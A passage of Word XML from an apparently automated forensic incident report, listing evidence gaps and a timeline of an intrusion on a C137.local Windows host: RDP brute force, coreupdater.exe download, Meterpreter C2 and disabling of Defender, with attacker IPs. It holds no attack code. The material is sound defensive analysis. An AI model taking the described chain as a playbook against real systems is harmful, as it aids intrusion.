      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 13 (Incident timeline and correlation): - The exact time of the migration into spoolsv.exe is not logged; only the 03:40:49–03:43:10 bounds are known.</w:t>
        <w:br/>
        <w:t>- What was done in the C2 sessions (including any exfiltration of loot.zip) cannot be seen because the traffic is encrypted.</w:t>
        <w:br/>
        <w:t>- There is no process-creation telemetry (no Sysmon, 4688 only at boot), so the commands run inside Meterpreter are unknown.</w:t>
        <w:br/>
        <w:t>- How the DC was compromised can only be inferred from the pcap; no disk or log evidence from the DC is available.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 14 (Summary, answers and recommendations): - No Sysmon or full 4688 data, so the full command lines are unknown.</w:t>
        <w:br/>
        <w:t>- Browser databases were not parsed.</w:t>
        <w:br/>
        <w:t>- The memory step stopped early because it hit the tool-call limit.</w:t>
        <w:br/>
        <w:t>- Because the C2 traffic is encrypted, data theft and credential theft cannot be proven at content level.</w:t>
        <w:br/>
        <w:t>- The DC was not collected.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Incomplete parsing sources: odl (warning).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:sectPr>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1020" w:right="1134" w:bottom="1020" w:left="1134" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Incident timeline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Key events established by the analysis (UTC), with their evidence. The complete timeline of the incident window (all artifacts) is provided in incident_timeline.csv.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1871"/>
        <w:gridCol w:w="1474"/>
        <w:gridCol w:w="2551"/>
        <w:gridCol w:w="5386"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="2551"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Timestamp (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Phase</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MITRE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>References</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>context</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Domain join restart (C137.local)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>System 1074 restart by SystemSettingsAdminFlows.exe; next boot 6005 at 21:42:39 reports Computer DESKTOP-SDN1RPT.C137.local.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40266</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#40276</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:55:33</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>context</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ricksanchez adds Administrator, Domain Admins, Domain Users, mortysmith to Remote Desktop Users</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4732 x4 on S-1-5-32-555 by C137\ricksanchez (LogonId 0x438E75, console). Pre-incident configuration that authorised the later RDP logon of C137\Administrator.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1098</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38829</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#38832</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:04</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>context</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Last system boot before acquisition</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>System 12 kernel boot StartTime 2020-09-19 01:24:04.5; 6005 at 01:24:09.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40528</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#40524</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:19:26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>initial access</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Attacker 194.61.24.102 scans and brute-forces RDP (Administrator) on DC 10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Host-clock equivalent (pcap 02:19:26 UTC +1 h). Nmap RDP cookie, then 198 Administrator RDP login requests until 03:56 host time.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1110.001 T1046</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#1</w:t>
              <w:br/>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:24:06</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>execution (DC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>DC 10.42.85.10 downloads coreupdater.exe from 194.61.24.102 and opens Meterpreter to 203.78.103.109</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Host-clock equivalent of pcap 02:24:06; same SHA256 10f3b920...; DC C2 sessions at 03:25, 03:29, 03:56 host time.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1105</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_fileinfo.jsonl#106</w:t>
              <w:br/>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#27979</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lateral movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RDP logon C137\Administrator from DC 10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4624 type 10 LogonId 0x857E73 (RecordID 2125), 1149 RecordID 39; session ends 03:52:13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1021.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39576</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#34902</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Attacker opens legacy Edge and navigates (typed URL, no Referer) to http://194.61.24.102/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP GET / to 194.61.24.102:80 from 10.42.85.115:50840, UA Edge/18.19041, 200 OK, 228-byte text/html directory listing. Pcap timestamp 02:39:26.94 UTC (raw 04:39:26+0200) = host 03:39:26 after the validated ~1 h capture-clock offset. Corroborated by the Administrator Windows Timeline (Edge activity on 194.61.24.102). First step of the payload staging, ~3 min after the RDP logon.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1105 T1204.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_http.jsonl#153</w:t>
              <w:br/>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#7</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:45</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>defense evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender real-time protection disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>5001 RecordID 36; 5007 SpyNetReporting/SubmitSamplesConsent 0, TamperProtection 0x4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1562.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35493</w:t>
              <w:br/>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8622</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>defense evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender TamperProtection value 0x1→0x4 after RTP/MAPS disable (state persists to acquisition)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender 5007 Features\TamperProtection 0x1→0x4 at 03:39:49.84, closing the 03:39:45–49 Defender weakening sequence; DisableRealtimeMonitoring=1 still present in SOFTWARE hive at acquisition, no re-enable event.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1562.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35496</w:t>
              <w:br/>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8622</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:57</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>coreupdater.exe downloaded via Edge from 194.61.24.102</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Edge cache + Downloads\coreupdater.exe, moved to System32 at 03:40:42</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1105</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35845</w:t>
              <w:br/>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35942</w:t>
              <w:br/>
              <w:t>suricata/case001.pcap/eve_fileinfo.jsonl#138</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:42</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>coreupdater.exe moved by Explorer from Administrator\Downloads to C:\Windows\System32</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Saved via Edge Save-As (OpenSavePidlMRU 03:40:00). ShellBag System32 03:40:23, Explorer CopyPaste 03:40:09, $J RenameNewName in System32 03:40:42.254 (same MFT entry). Executed 03:40:49.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1036.005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35942</w:t>
              <w:br/>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_OpenSavePidlMRU.csv#2</w:t>
              <w:br/>
              <w:t>sbecmd/Administrator_UsrClass.csv#34</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>command and control</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>coreupdater.exe executed (PID 8324), C2 to 203.78.103.109:443</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
